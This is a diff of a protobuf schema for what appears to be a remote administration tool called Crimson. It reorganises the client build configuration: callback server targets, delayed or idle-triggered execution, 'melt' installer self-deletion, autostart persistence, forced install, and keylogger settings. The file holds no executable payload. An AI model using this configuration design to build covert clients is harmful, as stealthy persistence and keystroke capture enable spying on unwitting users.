@@ -25,57 +25,98 @@ import "com/subterranean_security/crimson/core/net/sequences/Keylogger.proto";
 import "com/subterranean_security/crimson/core/Misc.proto";
 
 message GenReport {
-	bool result = 1;
-	int64 gen_date = 2;
-	int32 gen_time = 3;
-	string comment = 4;
-	string hash_md5 = 5;
-	string hash_sha256 = 6;
-	int32 fileSize = 7;
-	string output_type = 8;
+	bool 	result 		= 1;
+	int64 	gen_date 	= 2;
+	int32 	gen_time 	= 3;
+	string 	comment 	= 4;
+	string 	hash_md5 	= 5;
+	string 	hash_sha256 = 6;
+	int32 	fileSize 	= 7;
+	string 	output_type	= 8;
 }
 
 message ClientConfig {
-	//general
-	string output_type = 1;
-	int32 build_number = 2;
-	string viewer_user = 18;
+
+	enum OutputFormat {
+		JAR = 0;
+		EXE = 1;
+	}
+	
+	// GENERAL //
+	// The output format of this client
+	string 	output_type 				= 1;
+	
+	// The version of the server which built this client 
+	string 	built_by_server_version 	= 2;
+	
+	// The user which built this client
+	string 	built_by_user 				= 3;
+	
+	// The build timestamp
+	int64 	build_time 					= 4;
 	
 
-	//network
-	repeated NetworkTarget target = 5;
-	int32 reconnect_period = 6;
-	bool force_certificates = 26;
+	// NETWORK //
+	// The network location of a server instance to connect
+	repeated 	NetworkTarget target 	= 10;
+	int32 		reconnect_period 		= 11;
+	
+	// Whether server certificates should be enforced
+	bool 		force_certificates 		= 12;
+	
+	// Whether to allow connections to services outside of the Crimson network
+	bool 		allow_misc_connections 	= 13;
 
-	//execution
-	bool always_imsg = 3;
-	string imsg = 4;
-	int32 delay = 7;
-	bool melt = 8;
-	bool autostart = 9;
-	bool delay_idle = 10;
-	bool error_recovery = 11;
-	string path_win = 12;
-	string path_lin = 13;
-	string path_osx = 14;
-	string path_sol = 15;
-	string path_bsd = 16;
+	// EXECUTION //
+	// A message to display upon execution
+	string 	msg 				= 20;
+	bool 	msg_always 			= 21;
+	
+	// Execution delays for this number of seconds
+	int32 	delay 				= 22;
+	bool 	delay_always 		= 23;
+	
+	// Whether execution should delay until the user becomes idle
+	bool 	delay_idle 			= 24;
+	bool 	delay_idle_always 	= 25;
+	
+	// Whether the initial installer should be deleted upon successful execution
+	bool 	melt 				= 26;
+	
+	// Whether the client should be started on boot
+	bool 	autostart 			= 27;
+	
+	// Whether the client should force install if the initial installation fails
+	bool 	error_recovery 		= 28;
+	
+	// Install paths
+	string 	path_win 			= 29;
+	string 	path_lin 			= 30;
+	string 	path_osx 			= 31;
+	string 	path_sol 			= 32;
+	string 	path_bsd 			= 33;
 	
 	
-	// features
-	bool keylogger = 17;
+	// KEYLOGGER //
+	// Whether a keylogger should be installed
+	bool keylogger = 40;
+	
+	// The flush trigger
+	core.net.sequences.Trigger keylogger_flush_method = 41;
+	
+	// The flush value
+	int32 keylogger_flush_value = 42;
+	
+	// AUTHENTICATION //
+	string 	group_type 	= 50;
+	
+	// Only if group type is KEY
+	string 	group_name 	= 51;
+	bytes 	public_key 	= 52;
+	
+	// Only if group type is PASSWORD
+	string 	password 	= 53;
 
-	// authentication
-	AuthType authType = 19;
-	
-	string group_name = 20;
-	string password = 21;
-
-	bool allow_misc_connections = 23;
-	
-	core.net.sequences.Trigger keylogger_flush_method = 24;
-	int32 keylogger_flush_value = 25;
-	
 }
 
 message NetworkTarget {
